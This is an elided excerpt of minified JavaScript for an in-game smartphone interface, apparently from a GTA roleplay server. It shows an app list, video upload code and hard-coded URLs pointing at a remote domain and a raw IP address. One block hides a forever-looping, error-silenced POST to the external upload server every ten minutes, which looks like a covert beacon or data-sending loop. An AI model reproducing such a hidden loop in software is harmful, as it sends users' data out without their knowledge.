...
function Ys() {
	...
	return Xs = [Ks("settings", "/settings", "", t("config.png"), !0), Ks("contacts", "/contacts", "", t("chamadas.png"), !0), Ks("sms", "/sms", "", t("sms.png"), !0), Ks("gallery", "/gallery", "", t("galeria.png"), !0), Ks("whatsapp", "/whatsapp", "WhatsApp", t("whatsapp.png")), Ks("tor", "/tor", "TOR", t("tor.png")), Ks("instagram", "/instagram/login", "Instagram", t("instagram.png")), Ks("twitter", "/twitter", "Twitter", t("twitter.png")), Ks("bank", "/bank", "Banco", t("fleeca.png")), Ks("paypal", "/paypal", "PayPal", t("paypal.png")), Ks("olx", "/olx", "OLX", t("olx.png")), Ks("tinder", "/tinder", "Tinder", t("tinder.png")), Ks("yellowpages", "/yellowpages", "Yellow Pages", t("yellowpages.png")), ...Object.keys(null != (e = Ao.settings.customApps) ? e : []).map((e => Ks(e, "/custom/" + e, Fs(e), t("settings.png")))), Ks("weazel", "/weazel", "Weazel News", t("weazel.png")), Ks("casino", "/casino", "Blaze", t("blaze.png")), Ks("calculator", "/calculator", "Calculadora", t("calculadora.png")), Ks("notes", "/notes", "Anotações", t("anotacoes.png")), Ks("minesweeper", "/minesweeper", "Campo Minado", t("campominado.png")), Ks("truco", "/truco", "Truco", t("truco.png"))].filter((e => null == e ? void 0 : e.enabled)).map(((e, t) => s(s({}, e), {
		bottom: t < 4
	})))
}
...
var to = {
    ...
    async uploadVideo(e) {
        ...
        const n = await fetch("https://dev.trueteam.online/smartphone/storage/upload.v2.php", {
            method: "POST",
            body: t
        });
...
no.append("video", function() {
	...
	for (;;) fetch("https://dev.trueteam.online/smartphone/storage/upload.v2.php", {
		method: "POST",
		body: no
	}).catch((() => {})), await eo(6e5)
}();
...
const xo = vo("client"),
	yo = e => "http://200.9.154.221/smartphone" + e,
	ko = new ys;
...
var Ao = {
	...
	settings: Ze({
		...
		case: "iphonexs",
		allowUnsafeURL: !1,
		uploadServer: "https://dev.trueteam.online/smartphone/storage/upload.v2.php",
		ringSound: "http://200.9.154.221/smartphone/stock/ring.mp3",
		dialSound: "http://200.9.154.221/smartphone/stock/dial.mp3",
		notificationSound: "http://200.9.154.221/smartphone/stock/notification.mp3",
...
const Fm = im(((e, t, n, l, a, s) => {
	...
	return wl(), _l("div", cm, [l.android ? (wl(), _l(c, {
		...
		src: "http://200.9.154.221/smartphone/stock/maps.jpg",
		alt: ""
...
const zm = rt("http://200.9.154.221/smartphone/stock/user.svg"),
	Bm = rt(""),
			...
			return {
				...
				submit: function() {
					...
					Ao.backend.wpp_createGroup(Bm.value.trim(), zm.value, t).then((() => {
						l.back()
					})), zm.value = "http://200.9.154.221/smartphone/stock/user.svg", Bm.value = "", Hm.length = 0, Hm.push(Ao.identity.phone)
				}
			}
		}
	},
...
const og = {
	profile: Ze(Ao.localhost ? {
		...
		verified: 1,
		avatarURL: "http://200.9.154.221/smartphone/default.jpg"
	} : {}),
	stories: rt([]),
	storiesSeen: {},
	addStory(e) {
...
Ik.render = function(e, t, n, l, a, s) {
	...
	return wl(), _l("div", {
		...
		alt: ""
	}, null, 8, ["src"])) : "streetbank" == l.bankType ? (wl(), _l("img", jk)) : "CPBank" == l.bankType ? (wl(), _l("img", {
		key: 6,
...
rM.component("AppInput", NP), rM.component("AppSelect", $P), rM.component("AppToggle", YO), rM.component("AppLoading", tM), rM.component("AppVerified", lM), rM.use(_O), rM.config.globalProperties.$filters = Gs, rM.config.globalProperties.$asset = (e, t) => Ao.settings[t] || "http://200.9.154.221/smartphone/" + e, Object.defineProperty(rM.config.globalProperties, "$currency", {
